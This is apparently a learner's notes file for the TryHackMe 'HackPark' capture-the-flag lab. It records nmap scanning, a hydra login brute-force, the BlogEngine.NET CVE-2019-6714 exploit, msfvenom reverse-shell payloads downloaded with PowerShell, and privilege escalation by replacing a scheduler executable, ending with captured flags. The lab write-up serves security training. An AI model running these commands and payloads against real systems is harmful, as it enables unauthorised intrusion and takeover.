(kali㉿kali)-[~/THM/practice/hackpark]
└─$ nmap -sC -sV 10.10.220.204
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-07 15:30 EST
Nmap scan report for 10.10.220.204
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2022-02-07T20:31:52+00:00
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2022-02-06T20:30:21
|_Not valid after:  2022-08-08T20:30:21
|_ssl-date: 2022-02-07T20:31:52+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.90 seconds

# doing a dirb resulted in ALOT of results - I believe purposefully for the machine

### using hydra to brute-force a login ###
# I have not used hydra with the http-post-form before, so I looked up how to do this:
# this did not work:
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.220.204 http-post-form
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-08 08:26:23
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^: (null)
# the tryhackme page had a mini cheatsheet:
Command Description
hydra -P <wordlist> -v <ip> <protocol>
        Brute force against a protocol of your choice
hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
        You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
        Attack a Windows Remote Desktop with a password list.
hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
        Craft a more specific request for Hydra to brute force.


#I fired up burp and decided to proxy the post request, the results gave me some more parameters that I decided to try and include in the hydra attack


#so I tried this instead (after I deactivated burp suite
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.201.164 http-post-form "/Account/login.aspx:__V 
IEWSTATE=l3Yk6eK34PEwrc4tPgJSmWzcqVeShyN2RirnvfmgjgdAW5qbbh4fHrTUnrbJzcZb4W4ejYayXbWnCvMxQeZizwOl2Dbbx6d%2BL 
ijpJ%2FudLWNBtYiyp9uK1z8mIfBt0j8D3WYomdTNpUg7LTyOitVFHgzGY%2BMfSUpr5AgyI9NoLmfoq0x%2F&__EVENTVALIDATION=PP8I 
Nhz%2BshH3%2BKMq1XHHl3ff6s6eF%2FanNJWiMF0TuGcj4KrXsdINfWGSFdqQObkbptPU7NZAtHlrdM41fSj4zp5Myl1knw8aElb89ezpBx 
0As9mgHz6mhq17oTewE%2FAZAtyPjG1AGXJ2xeE%2B6Mhel%2B95d7P05fU7lKmcM2t480WuC5bQ&ctl00%24MainContent%24LoginUser 
%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24Login 
Button=Log+in:Login failed" -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-08 15:52:59
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://10.10.201.164:80/Account/login.aspx:__V
IEWSTATE=l3Yk6eK34PEwrc4tPgJSmWzcqVeShyN2RirnvfmgjgdAW5qbbh4fHrTUnrbJzcZb4W4ejYayXbWnCvMxQeZizwOl2Dbbx6d%2BL
ijpJ%2FudLWNBtYiyp9uK1z8mIfBt0j8D3WYomdTNpUg7LTyOitVFHgzGY%2BMfSUpr5AgyI9NoLmfoq0x%2F&__EVENTVALIDATION=PP8I
Nhz%2BshH3%2BKMq1XHHl3ff6s6eF%2FanNJWiMF0TuGcj4KrXsdINfWGSFdqQObkbptPU7NZAtHlrdM41fSj4zp5Myl1knw8aElb89ezpBx
0As9mgHz6mhq17oTewE%2FAZAtyPjG1AGXJ2xeE%2B6Mhel%2B95d7P05fU7lKmcM2t480WuC5bQ&ctl00%24MainContent%24LoginUser
%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24Login
Button=Log+in:Login failed
[80][http-post-form] host: 10.10.201.164   login: admin   password: password
[80][http-post-form] host: 10.10.201.164   login: admin   password: 123456
[80][http-post-form] host: 10.10.201.164   login: admin   password: 123456789
[80][http-post-form] host: 10.10.201.164   login: admin   password: princess
[80][http-post-form] host: 10.10.201.164   login: admin   password: 12345678
[80][http-post-form] host: 10.10.201.164   login: admin   password: abc123
[80][http-post-form] host: 10.10.201.164   login: admin   password: monkey
[80][http-post-form] host: 10.10.201.164   login: admin   password: daniel
[80][http-post-form] host: 10.10.201.164   login: admin   password: 654321
[80][http-post-form] host: 10.10.201.164   login: admin   password: iloveu
[80][http-post-form] host: 10.10.201.164   login: admin   password: andrea
[80][http-post-form] host: 10.10.201.164   login: admin   password: flower
[80][http-post-form] host: 10.10.201.164   login: admin   password: hottie
[80][http-post-form] host: 10.10.201.164   login: admin   password: 1234567
[80][http-post-form] host: 10.10.201.164   login: admin   password: babygirl
[80][http-post-form] host: 10.10.201.164   login: admin   password: jessica
[80][http-post-form] host: 10.10.201.164   login: admin   password: michael
[80][http-post-form] host: 10.10.201.164   login: admin   password: ashley
[80][http-post-form] host: 10.10.201.164   login: admin   password: bubbles
[80][http-post-form] host: 10.10.201.164   login: admin   password: hello
[80][http-post-form] host: 10.10.201.164   login: admin   password: elizabeth
[80][http-post-form] host: 10.10.201.164   login: admin   password: charlie
[80][http-post-form] host: 10.10.201.164   login: admin   password: hannah
[80][http-post-form] host: 10.10.201.164   login: admin   password: 123123
[80][http-post-form] host: 10.10.201.164   login: admin   password: basketball
[80][http-post-form] host: 10.10.201.164   login: admin   password: andrew
[80][http-post-form] host: 10.10.201.164   login: admin   password: angels
[80][http-post-form] host: 10.10.201.164   login: admin   password: fuckyou
[80][http-post-form] host: 10.10.201.164   login: admin   password: secret
[80][http-post-form] host: 10.10.201.164   login: admin   password: loveme
[80][http-post-form] host: 10.10.201.164   login: admin   password: sunshine
[80][http-post-form] host: 10.10.201.164   login: admin   password: butterfly
[80][http-post-form] host: 10.10.201.164   login: admin   password: carlos
[80][http-post-form] host: 10.10.201.164   login: admin   password: joshua
[80][http-post-form] host: 10.10.201.164   login: admin   password: anthony
[80][http-post-form] host: 10.10.201.164   login: admin   password: qwerty
[80][http-post-form] host: 10.10.201.164   login: admin   password: 111111
[80][http-post-form] host: 10.10.201.164   login: admin   password: tigger
[80][http-post-form] host: 10.10.201.164   login: admin   password: chocolate
[80][http-post-form] host: 10.10.201.164   login: admin   password: friends
[80][http-post-form] host: 10.10.201.164   login: admin   password: purple
[80][http-post-form] host: 10.10.201.164   login: admin   password: loveyou
[80][http-post-form] host: 10.10.201.164   login: admin   password: 12345
[80][http-post-form] host: 10.10.201.164   login: admin   password: rockyou
[80][http-post-form] host: 10.10.201.164   login: admin   password: iloveyou
[80][http-post-form] host: 10.10.201.164   login: admin   password: nicole
[80][http-post-form] host: 10.10.201.164   login: admin   password: lovely
[80][http-post-form] host: 10.10.201.164   login: admin   password: playboy
[80][http-post-form] host: 10.10.201.164   login: admin   password: superman
[80][http-post-form] host: 10.10.201.164   login: admin   password: tinkerbell
[80][http-post-form] host: 10.10.201.164   login: admin   password: 1234567890
[80][http-post-form] host: 10.10.201.164   login: admin   password: pretty
[80][http-post-form] host: 10.10.201.164   login: admin   password: tweety
[80][http-post-form] host: 10.10.201.164   login: admin   password: angel
[80][http-post-form] host: 10.10.201.164   login: admin   password: jordan
[80][http-post-form] host: 10.10.201.164   login: admin   password: liverpool
[80][http-post-form] host: 10.10.201.164   login: admin   password: justin
[80][http-post-form] host: 10.10.201.164   login: admin   password: jennifer
[80][http-post-form] host: 10.10.201.164   login: admin   password: amanda
[80][http-post-form] host: 10.10.201.164   login: admin   password: password1
[80][http-post-form] host: 10.10.201.164   login: admin   password: football
[80][http-post-form] host: 10.10.201.164   login: admin   password: 000000
[80][http-post-form] host: 10.10.201.164   login: admin   password: michelle
[80][http-post-form] host: 10.10.201.164   login: admin   password: soccer
1 of 1 target successfully completed, 64 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-08 15:53:11

#it worked, now I just had to figure out which was the right one...
        #only thing - it seems like theres too many to be legitimate...
#apparently the password is 1qaz2wsx but I did not get that at all..

#I looked up some help so I did:
#1 - run the login through burp
#2 - begin the hydra line and include the URL
#3 - use the viewpoert from burp
#4 get credentials:
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.201.164 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=whBv9ZUZARu2sYquSYdczc192OuoMXw1UIkr6GMuuxSj16dK6ey6shzW%2FjIXOXYmHDA1WyTOLq3ZmI9Yti7VQNz%2FvvCKyetvBHVOMoJX9Z2s%2B8%2FURdlxNM7QD4BKNCCVeuuONcSaO4KLICfpQHc%2FC0wC42%2B%2Bjr36vNZ7Rx0mfGR162IGraHTOkGhen01g6Oru7ouwfSIIEJsidTuGIG6lUfht2igZbpJ7nvXPURvslqWQwU4DV2qa7z7ZJlxcogsYLx0zvizu9%2B%2FIEX3WoyMEHAvBjxzA7wzRVC19zjxcVYjiLI31aaDmvzAsHeiPHLxLYU9o52D%2Bcce6xktsd0qjNQtPcOshbVkq03IitskAI36gSZ2&__EVENTVALIDATION=x1CcHyy8tyXpHPNg20Vz9wSnJWbplza4AC%2BOkoijSo%2BGVWEi79dQfzc1cUG29wq%2FaHQoDa24LQZEMv09%2Ftb4JN4VFNN2%2Bulmz8hZe97YoaL6NxrKUYfthVClnsYYxj8yEvgxh%2FQf9ydtolOQg78RKxQsSLrTuXA0JbeDMXLoijvhw05N&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-08 16:25:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.201.164:80/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=whBv9ZUZARu2sYquSYdczc192OuoMXw1UIkr6GMuuxSj16dK6ey6shzW%2FjIXOXYmHDA1WyTOLq3ZmI9Yti7VQNz%2FvvCKyetvBHVOMoJX9Z2s%2B8%2FURdlxNM7QD4BKNCCVeuuONcSaO4KLICfpQHc%2FC0wC42%2B%2Bjr36vNZ7Rx0mfGR162IGraHTOkGhen01g6Oru7ouwfSIIEJsidTuGIG6lUfht2igZbpJ7nvXPURvslqWQwU4DV2qa7z7ZJlxcogsYLx0zvizu9%2B%2FIEX3WoyMEHAvBjxzA7wzRVC19zjxcVYjiLI31aaDmvzAsHeiPHLxLYU9o52D%2Bcce6xktsd0qjNQtPcOshbVkq03IitskAI36gSZ2&__EVENTVALIDATION=x1CcHyy8tyXpHPNg20Vz9wSnJWbplza4AC%2BOkoijSo%2BGVWEi79dQfzc1cUG29wq%2FaHQoDa24LQZEMv09%2Ftb4JN4VFNN2%2Bulmz8hZe97YoaL6NxrKUYfthVClnsYYxj8yEvgxh%2FQf9ydtolOQg78RKxQsSLrTuXA0JbeDMXLoijvhw05N&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[80][http-post-form] host: 10.10.201.164   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-08 16:25:39

#password is 1qaz2wsx










### compromising the machine ###
#next goal is therefore to gain initial access

#the version of the BlogEngine.NET is 3.3.6.0 and the vulnarebility is CVE-2019-6714

##METHOD:
#1 set the attack address + port
#2 set up a reverse TCP listener (nc?)
#3 its 'uploaded' by clicking on what looks like an open file in the toolbar
        #must be uploaded as PostView.ascx
#4 upload to <ip>/admin/app/editor/editpost.cshtml (reached by creating new post on the engine)
#5 file will be located in /App_Data/files directory
#6 vuln is triggered by accessing the base URL for the blog with a theme override:
        #<ip>/?theme=../../App_Data/files




# I proceeded to download the expploit and move it to same directory as this file
# Then I changed the ip + port in the exploit to 10.11.59.68 and 4443
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ mousepad 46353.cs
# renamed the file
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ cp 46353.cs PostView.ascx
# I set up a nc listener:
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ nc -nvlp 4443 
listening on [any] 4443 ...
# I uploaded it to the new post and saved the post as shell
# then I went to <ip>/?theme=../../App_Data/files
        #and we got a shell!
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ nc -nvlp 4443 
listening on [any] 4443 ...
connect to [10.11.59.68] from (UNKNOWN) [10.10.200.76] 49237
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

#shell seems VERY unstable so I will be trying to stabilise it using metaslpoit

#first I have to create a payload using msfvenom: (https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ msfvenom -p windows/shell/reverse_tcp LHOST=10.11.59.68 LPORT=9001 -f exe > reverse.exe           127 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
        #this is a non-meterpreter binary
#I then had to upload it to the machine via the shell I have already established
        #I believe the best way is to use an http server but I am not 100% sure what the command for it is
        #(looking at one of the writeups I found a powershell command)
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

#had to change the directory to upload the reverse.exe to the machine:
c:\windows\Temp>
powershell -c "Invoke-WebRequest -Uri 'http://10.11.59.68:80/reverse.exe' -Outfile 'C:\Windows\Temp\reverse.exe'"

10.10.200.76 - - [09/Feb/2022 08:01:18] "GET /reverse.exe HTTP/1.1" 200 -

#next I set up the metasploit for the meterpreter:
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.59.68
LHOST => 10.11.59.68
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.59.68:9001 
[*] Sending stage (175174 bytes) to 10.10.64.254
[*] Meterpreter session 1 opened (10.11.59.68:9001 -> 10.10.64.254:49245) at 2022-02-10 17:26:11 -0500


#^^after running the metasploit I executed the reverse.exe file on the windows system using reverse.exe

#checking for OS info
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

#next Ill upload winpeas to the meterpreter shell:
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ cd /home/kali/tools/PEASS-ng/winPEAS/winPEASbat                                                              1 ⨯
                                                                                                                     
┌──(kali㉿kali)-[~/tools/PEASS-ng/winPEAS/winPEASbat]
└─$ ls
README.md  winPEAS.bat
                                                                                                                     
┌──(kali㉿kali)-[~/tools/PEASS-ng/winPEAS/winPEASbat]
└─$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

meterpreter > shell
Process 2656 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)>cd C:\Windows\Temp
cd C:\Windows\Temp

C:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 'http://10.11.59.68:80/winPEAS.bat' -Outfile 'C:\Windows\Temp\winPEAS.bat'"
powershell -c "Invoke-WebRequest -Uri 'http://10.11.59.68:80/winPEAS.bat' -Outfile 'C:\Windows\Temp\winPEAS.bat'"

C:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of C:\Windows\Temp

02/10/2022  02:41 PM    <DIR>          .
02/10/2022  02:41 PM    <DIR>          ..
08/06/2019  01:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
08/06/2019  01:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
08/06/2019  01:13 PM             1,206 cleanup.txt
08/06/2019  01:13 PM               421 cmdout
08/06/2019  01:11 PM                 0 DMI2EBC.tmp
08/03/2019  09:43 AM                 0 DMI4D21.tmp
08/06/2019  01:12 PM             8,743 EC2ConfigService_20190806141221.log
08/06/2019  01:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
02/10/2022  02:41 PM    <DIR>          Microsoft
02/10/2022  02:25 PM            73,802 reverse.exe
08/06/2019  01:13 PM                21 stage1-complete.txt
08/06/2019  01:13 PM            28,495 stage1.txt
05/12/2019  08:03 PM           113,328 svcexec.exe
08/06/2019  01:13 PM                67 tmp.dat
02/10/2022  02:41 PM            35,762 winPEAS.bat
              14 File(s)        744,546 bytes
               3 Dir(s)  39,124,873,216 bytes free

# then I ran it to see what odd services might be running and exploitable
C:\Windows\Temp>.\winPEAS.bat
.\winPEAS.bat

            ((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                       
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*                                                                    
   ((((((((((((((((* *****,,,/########## .(* ,((((((                                                                 
   (((((((((((/* ******************/####### .(. ((((((                                                               
   ((((((..******************/@@@@@/***/###### /((((((                                                               
   ,,..**********************@@@@@@@@@@(***,#### ../(((((                                                            
   , ,**********************#@@@@@#@@@@*********##((/ /((((                                                          
   ..(((##########*********/#@@@@@@@@@/*************,,..((((                                                         
   .(((################(/******/@@@@@#****************.. /((                                                         
   .((########################(/************************..*(                                                         
   .((#############################(/********************.,(                                                         
   .((##################################(/***************..(                                                         
   .((######################################(************..(                                                         
   .((######(,.***.,(###################(..***(/*********..(                                                         
   .((######*(#####((##################((######/(********..(                                                         
   .((##################(/**********(################(**...(                                                         
   .(((####################/*******(###################.((((                                                         
   .(((((############################################/  /((                                                          
   ..(((((#########################################(..(((((.                                                         
   ....(((((#####################################( .((((((.                                                          
   ......(((((#################################( .(((((((.                                                           
   (((((((((. ,(############################(../(((((((((.                                                           
       (((((((((/,  ,####################(/..((((((((((.                                                             
             (((((((((/,.  ,*//////*,. ./(((((((((((.                                                                
                (((((((((((((((((((((((((((/                                                                         
                       by carlospolop                   

# part im currently interested in:
[+] RUNNING PROCESSES                                                                                               
   [i] Something unexpected is running? Check for vulnerabilities                                                    
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                      
                                                                                                                     
Image Name                     PID Services                                                                          
========================= ======== ============================================                                      
System Idle Process              0 N/A                                                                               
System                           4 N/A                                                                               
smss.exe                       368 N/A                                                                               
csrss.exe                      524 N/A                                                                               
csrss.exe                      580 N/A                                                                               
wininit.exe                    588 N/A                                                                               
winlogon.exe                   616 N/A                                                                               
services.exe                   672 N/A                                                                               
lsass.exe                      680 SamSs                                                                             
svchost.exe                    740 BrokerInfrastructure, DcomLaunch, LSM,                                            
                                   PlugPlay, Power, SystemEventsBroker                                               
svchost.exe                    784 RpcEptMapper, RpcSs                                                               
dwm.exe                        864 N/A                                                                               
svchost.exe                    876 Dhcp, EventLog, lmhosts, Wcmsvc                                                   
svchost.exe                    904 CertPropSvc, DsmSvc, gpsvc, iphlpsvc,                                             
                                   LanmanServer, ProfSvc, Schedule, SENS,                                            
                                   SessionEnv, ShellHWDetection, Themes,                                             
                                   Winmgmt                                                                           
svchost.exe                    964 EventSystem, FontCache, netprofm, nsi,                                            
                                   W32Time, WinHttpAutoProxySvc                                                      
svchost.exe                    344 CryptSvc, Dnscache, LanmanWorkstation,                                            
                                   NlaSvc, WinRM                                                                     
svchost.exe                    812 BFE, DPS, MpsSvc                                                                  
spoolsv.exe                   1136 Spooler                                                                           
amazon-ssm-agent.exe          1168 AmazonSSMAgent                                                                    
svchost.exe                   1248 AppHostSvc                                                                        
LiteAgent.exe                 1268 AWSLiteAgent                                                                      
svchost.exe                   1336 TrkWks, UALSVC, UmRdpService                                                      
svchost.exe                   1352 W3SVC, WAS                                                                        
WService.exe                  1420 WindowsScheduler
#^^ windowsscheduler

# next I backgrounded the shell sesion and went to the SystemServices directory in the meterpreter
meterpreter > ls
Listing: C:\Program Files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   4096     dir   2019-08-04 07:36:53 -0400  Events
100666/rw-rw-rw-  60       fil   2019-08-04 07:36:42 -0400  Forum.url
100666/rw-rw-rw-  9813     fil   2019-08-04 07:36:42 -0400  License.txt
100666/rw-rw-rw-  1496     fil   2019-08-04 07:37:02 -0400  LogFile.txt
100666/rw-rw-rw-  3760     fil   2019-08-04 07:36:53 -0400  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2019-08-04 07:36:42 -0400  Message.exe
100777/rwxrwxrwx  445344   fil   2019-08-04 07:36:42 -0400  PlaySound.exe
100777/rwxrwxrwx  27040    fil   2019-08-04 07:36:42 -0400  PlayWAV.exe
100666/rw-rw-rw-  149      fil   2019-08-04 07:36:53 -0400  Preferences.ini
100777/rwxrwxrwx  485792   fil   2019-08-04 07:36:42 -0400  Privilege.exe
100666/rw-rw-rw-  10100    fil   2019-08-04 07:36:42 -0400  ReadMe.txt
100777/rwxrwxrwx  112544   fil   2019-08-04 07:36:42 -0400  RunNow.exe
100777/rwxrwxrwx  235936   fil   2019-08-04 07:36:42 -0400  SSAdmin.exe
100777/rwxrwxrwx  731552   fil   2019-08-04 07:36:42 -0400  SSCmd.exe
100777/rwxrwxrwx  456608   fil   2019-08-04 07:36:42 -0400  SSMail.exe
100777/rwxrwxrwx  1633696  fil   2019-08-04 07:36:42 -0400  Scheduler.exe
100777/rwxrwxrwx  491936   fil   2019-08-04 07:36:42 -0400  SendKeysHelper.exe
100777/rwxrwxrwx  437664   fil   2019-08-04 07:36:42 -0400  ShowXY.exe
100777/rwxrwxrwx  439712   fil   2019-08-04 07:36:42 -0400  ShutdownGUI.exe
100666/rw-rw-rw-  785042   fil   2019-08-04 07:36:42 -0400  WSCHEDULER.CHM
100666/rw-rw-rw-  703081   fil   2019-08-04 07:36:42 -0400  WSCHEDULER.HLP
100777/rwxrwxrwx  136096   fil   2019-08-04 07:36:42 -0400  WSCtrl.exe
100777/rwxrwxrwx  68512    fil   2019-08-04 07:36:42 -0400  WSLogon.exe
100666/rw-rw-rw-  33184    fil   2019-08-04 07:36:42 -0400  WSProc.dll
100666/rw-rw-rw-  2026     fil   2019-08-04 07:36:42 -0400  WScheduler.cnt
100777/rwxrwxrwx  331168   fil   2019-08-04 07:36:42 -0400  WScheduler.exe
100777/rwxrwxrwx  98720    fil   2019-08-04 07:36:42 -0400  WService.exe
100666/rw-rw-rw-  54       fil   2019-08-04 07:36:42 -0400  Website.url
100777/rwxrwxrwx  76704    fil   2019-08-04 07:36:42 -0400  WhoAmI.exe
100666/rw-rw-rw-  1150     fil   2019-08-04 07:36:42 -0400  alarmclock.ico
100666/rw-rw-rw-  766      fil   2019-08-04 07:36:42 -0400  clock.ico
100666/rw-rw-rw-  80856    fil   2019-08-04 07:36:42 -0400  ding.wav
100666/rw-rw-rw-  1637972  fil   2019-08-04 07:36:42 -0400  libeay32.dll
100777/rwxrwxrwx  40352    fil   2019-08-04 07:36:42 -0400  sc32.exe
100666/rw-rw-rw-  766      fil   2019-08-04 07:36:42 -0400  schedule.ico
100666/rw-rw-rw-  355446   fil   2019-08-04 07:36:42 -0400  ssleay32.dll
100666/rw-rw-rw-  6999     fil   2019-08-04 07:36:42 -0400  unins000.dat
100777/rwxrwxrwx  722597   fil   2019-08-04 07:36:42 -0400  unins000.exe
100666/rw-rw-rw-  6574     fil   2019-08-04 07:36:42 -0400  whiteclock.ico

#the interesting part here is the message.exe which we are supposed to execute, but first lets look into Events
meterpreter > cd Events
meterpreter > ls
Listing: C:\Program Files (x86)\SystemScheduler\Events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1926   fil   2019-08-04 18:05:19 -0400  20198415519.INI
100666/rw-rw-rw-  22826  fil   2019-08-04 18:06:01 -0400  20198415519.INI_LOG.txt
100666/rw-rw-rw-  290    fil   2020-10-02 17:50:12 -0400  2020102145012.INI
100666/rw-rw-rw-  185    fil   2022-02-10 17:16:25 -0500  Administrator.flg
100666/rw-rw-rw-  182    fil   2022-02-10 17:15:20 -0500  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2022-02-10 17:16:25 -0500  Scheduler.flg
100666/rw-rw-rw-  448    fil   2019-08-04 07:36:53 -0400  SessionInfo.flg
100666/rw-rw-rw-  0      fil   2022-02-10 17:15:20 -0500  service.flg


#looks like there are some flag files?
meterpreter > cat Administrator.flg
[LatestSessionInfo]
SessionID=1
[Administrator1]
Time=10/02/22 14:46:26
RemoteSession=0
DesktopName=Default
StationName=WinSta0
SessionID=1
ProcessID=872
UserID=Administrator

#apparently next steps are:
        #1 upload revrese.exe to the new WD
        #2 mv Message.exe Message.bak
        #3 mv reverse.exe Message.exe
        #4 background the session
        #5 rerun 'exploit'
# it went like this:

(kali㉿kali)-[~/tools/PEASS-ng/winPEAS/winPEASbat]
└─$ cd /home/kali/THM/practice/hackpark                                                                          1 ⨯
                                                                                                                     
┌──(kali㉿kali)-[~/THM/practice/hackpark]
└─$ ls
46353.cs  notes.txt  PostView.ascx  reverse.exe
                                                                                                                     
┌──(kali㉿kali)-[~/THM/practice/hackpark]
└─$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

 
C:\Program Files (x86)\SystemScheduler>powershell -c "Invoke-WebRequest -Uri 'http://10.11.59.68:80/reverse.exe'reverse.exe'"

C:\Program Files (x86)\SystemScheduler>exit
meterpreter > mv Message.exe Message.bak
meterpreter > mv reverse.exe Message.exe

#so far so good so I proceeded to do the following:
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.59.68:9001 
[*] Sending stage (175174 bytes) to 10.10.64.254
[*] Meterpreter session 2 opened (10.11.59.68:9001 -> 10.10.64.254:49295) at 2022-02-10 18:06:06 -0500

meterpreter > shell
Process 1944 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>

#and it looks like we have gotten some new privileges
C:\PROGRA~2>whoami
whoami
hackpark\administrator


#time to look around
C:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39

#got the user flag, next is admin flag
C:\Users\Administrator\Desktop>type root.txt
type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72

#nice:)









## privesc without metasploit ###
        #1 = use reverse shell we got 
        #2 = use winPEAS to enumerate the system

#1 generate a more stable shell using msfvenom:
(kali㉿kali)-[~/THM/practice/hackpark]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.59.68 LPORT=9999 -f exe > shell.exe                 130 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

#2 pull it to the box (httpserver + powershell):
kali㉿kali)-[~/THM/practice/hackpark]
└─$ python -m SimpleHTTPServer 80

c:\windows\system32\inetsrv>
powershell -c "Invoke-WebRequest -Uri 'http://10.11.59.68:80/shell.exe' -Outfile 'C:\Windows\Temp\shell.exe'"

        #andddd
C:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Windows\Temp
02/10/2022  03:22 PM    <DIR>          .
02/10/2022  03:22 PM    <DIR>          ..
